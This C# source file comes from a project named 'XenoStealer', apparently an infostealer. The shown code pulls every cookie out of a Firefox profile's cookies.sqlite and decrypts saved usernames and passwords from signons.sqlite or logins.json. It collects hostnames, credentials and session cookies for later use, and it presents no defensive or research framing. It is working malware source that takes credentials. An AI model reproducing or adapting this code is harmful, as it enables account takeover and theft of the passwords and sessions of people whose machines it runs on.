using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace XenoStealer.DataExtraction.Browsers
{
    public static class Gecko
    {


        public static DataExtractionStructs.GeckoCookie[] GetCookies(string profilePath)
        {

            List<DataExtractionStructs.GeckoCookie> cookies = new List<DataExtractionStructs.GeckoCookie>();

            string db_location = Path.Combine(profilePath, "cookies.sqlite");
            if (!File.Exists(db_location)) 
            {
                return null;
            }

            byte[] fileBytes=Utils.ForceReadFile(db_location);
            if (fileBytes == null) 
            {
                return null;
            }

            SqlLite3Parser parser = null;
            try 
            { 
                parser = new SqlLite3Parser(fileBytes);
            } 
            catch 
            {
                return null;
            }

            if (!parser.ReadTable("moz_cookies"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                try
                {
                    string host = parser.GetValue(i, "host");
                    string name = parser.GetValue(i, "name");
                    string value = parser.GetValue(i, "value");
                    string path = parser.GetValue(i, "path");
                    if (!ulong.TryParse(parser.GetValue(i, "expiry"), out ulong expiry))
                    {
                        continue;
                    }
                    bool secure = parser.GetValue(i, "isSecure") != "0";
                    bool httpOnly = parser.GetValue(i, "isHttpOnly") != "0";
                    cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                }
                catch 
                {
                    continue;
                }

            }

            return cookies.ToArray();

        }
        public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath, GeckoDecryptor decryptor) 
        {
            List<DataExtractionStructs.GeckoLogin> logins = new List<DataExtractionStructs.GeckoLogin>();


            if (!decryptor.SetProfilePath(profilePath)) 
            {
                return null;
                //fail.
            }

            string SQLpath = Path.Combine(profilePath, "signons.sqlite");
            string JSONpath = Path.Combine(profilePath, "logins.json");
            if (File.Exists(SQLpath) && new FileInfo(SQLpath).Length > 100)
            {
                byte[] sqlFileBytes = Utils.ForceReadFile(SQLpath);

                if (sqlFileBytes == null) 
                {
                    return null;
                    //fail.
                }


                SqlLite3Parser parser;

                try 
                {
                    parser=new SqlLite3Parser(sqlFileBytes);
                } 
                catch 
                {
                    return null;
                    //fail.
                }

                if (!parser.ReadTable("moz_logins")) 
                { 
                    return null;
                    //fail.
                }

                for (int i = 0; i < parser.GetRowCount(); i++)
                {
                    try
                    {
                        string hostname = parser.GetValue(i, "hostname");
                        string encryptedUsername = parser.GetValue(i, "encryptedUsername");
                        string encryptedPassword = parser.GetValue(i, "encryptedPassword");
                        string username = decryptor.Decrypt(encryptedUsername);
                        string password = decryptor.Decrypt(encryptedPassword);
                        if (hostname == null || username == null || password == null) continue;
                        logins.Add(new DataExtractionStructs.GeckoLogin(hostname, username, password));
                        //add it to passwords and stuff.
                    }
                    catch 
                    {
                        continue;//even if it errors, allow it to finish looping, it could be a single.
                    }
                }


            }
            else if (File.Exists(JSONpath))
            {
                byte[] jsonFileBytes = Utils.ForceReadFile(JSONpath);

                if (jsonFileBytes == null) 
                { 
                    return null;
                    //fail.
                }
                
                dynamic jsonObject;

                try 
                {
                    string jsonText = Encoding.UTF8.GetString(jsonFileBytes);
                    JavaScriptSerializer serializer = new JavaScriptSerializer();
                    jsonObject = serializer.Deserialize<dynamic>(jsonText);
                } 
                catch 
                { 
                    return null;
                    //fail.
                }

                if (jsonObject != null && jsonObject.ContainsKey("logins"))
                {
                    dynamic[] json_logins = jsonObject["logins"];
                    foreach (dynamic login in json_logins)
                    {
                        if (login != null && login.ContainsKey("hostname") && login.ContainsKey("encryptedUsername") && login.ContainsKey("encryptedPassword"))
                        {
                            try
                            {
                                string hostname = (string)login["hostname"];
                                string encryptedUsername = (string)login["encryptedUsername"];
                                string encryptedPassword = (string)login["encryptedPassword"];
                                string username = decryptor.Decrypt(encryptedUsername);
                                string password = decryptor.Decrypt(encryptedPassword);
                                if (hostname == null || username == null || password == null) continue;
                                logins.Add(new DataExtractionStructs.GeckoLogin(hostname, username, password));
                                //add it to passwords and stuff.
                            }
                            catch 
                            {
                                continue;//even if it errors, allow it to finish looping, it could be a single.
                            }
                            
                        }
                    }
                }
                else 
                {
                    return null;
                    //fail.
                }

            }
            else 
            {
                return null;
                //fail.
            }

            return logins.ToArray();
        }

    }
}
